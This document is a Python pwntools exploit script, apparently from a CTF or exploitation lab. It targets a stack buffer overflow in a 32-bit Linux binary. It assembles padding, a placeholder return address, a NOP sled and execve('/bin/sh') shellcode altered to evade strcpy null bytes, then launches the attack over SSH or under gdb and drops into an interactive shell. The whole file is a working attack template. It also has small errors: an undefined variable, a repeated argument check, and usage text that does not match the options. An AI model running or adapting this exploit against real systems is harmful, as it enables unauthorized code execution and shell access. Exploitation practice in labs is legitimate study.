from pwn import *
import sys

context.update(arch='i386', os='linux')
context.terminal = ["tmux", "splitw", "-h"]

target = "./target"
jump_target = 0xdeadbeef
remote_dir = '/home/exploit_location'

code = '''
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
/* push '/bin///sh\x00' */
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx, esp
/* push argument array ['sh\x00'] */
/* push 'sh\x00\x00' */
push 0x1010101
pop ecx
xor ecx, 0x1016972
push ecx
xor ecx, ecx
push ecx /* null terminate */
push 4
pop ecx
add ecx, esp
push ecx /* 'sh\x00' */
mov ecx, esp
xor edx, edx
/* call execve(), need to add/sub 0x30 to bypass strcpy */
push 0x3b /* 0xb */
pop eax
sub eax, 0x30
int 0x80
'''

def print_usage():
    print("usage:\txploit s|l")
    print("\tr: run exploit")
    print("\td: debug exploit")

def print_shellcode(shellcode):
    print(shellcode)
    print(hexdump(asm(shellcode)))
def produce_payload():
    payload = cyclic(cyclic_find(0x61616165))
    payload += p32(0xDEADBEEF)
    payload += cyclic(cyclic_find(0x61616164))
    payload += p32(jump_target)
    payload += asm("nop")*100
    payload += asm(code)
    return payload
    

def debug_exploit_local(payload):
    p = gdb.debug([target, payload], 
                  gdbscript='''
                  break main
                  init-pwndbg
                  ''',
                  cwd=working_directory)
    p.sendline(payload)
    p.interactive()

def run_exploit_ssh(payload):
    s = ssh(user = '', host='', password='')
    sh = s.process(executable=remote_dir, cwd=working_directory, env={})
    sh.sendline(payload)
    sh.interactive()

payload = produce_payload()


if (len(sys.argv) != 2):
    print_usage()
    exit(0)
run_location = sys.argv[1]

if (len(sys.argv) != 2):
    print_usage()
    exit(0)
run_location = sys.argv[1]
if (run_location == "r"):
    run_exploit_ssh(payload)
elif (run_location == "d"):
    debug_exploit_local(payload)
else:
    print_usage()
    exit(0)